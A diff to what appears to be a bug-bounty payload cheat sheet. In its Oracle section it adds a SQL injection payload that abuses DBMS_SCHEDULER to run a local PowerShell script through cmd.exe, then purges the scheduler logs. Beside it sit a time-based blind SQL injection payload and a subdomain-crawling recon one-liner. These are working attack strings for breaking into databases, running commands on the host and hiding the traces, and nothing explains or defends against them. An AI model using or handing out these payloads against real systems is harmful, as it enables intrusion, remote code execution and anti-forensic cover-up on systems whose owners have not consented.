@@ -430,6 +430,7 @@ echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yo
 ### Oracle
 ```
 1) UNION SELECT CASE WHEN (SELECT ASCII(SUBSTR((SELECT user FROM dual), 1, 1 )) FROM dual) >71 THEN (dbms_pipe.receive_message(('a'),10)) ELSE NULL END FROM dual --
+1' AND 1=2 UNION SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''exec4'',''EXECUTABLE'',''c:\\WINDOWS\\system32\\cmd.exe /c type C:\\users\\public\\shell.ps1 | PowerShell.exe -noprofile - '',0,TRUE);DBMS_SCHEDULER.create_job(job_name=>''myjob11'',program_name=>''exec4'',start_date=>NULL,repeat_interval=>NULL,end_date=>NULL,enabled=>TRUE,auto_drop=>TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=>''exec4'');dbms_scheduler.purge_log;'), null  FROM DUAL --
 ```
 
 
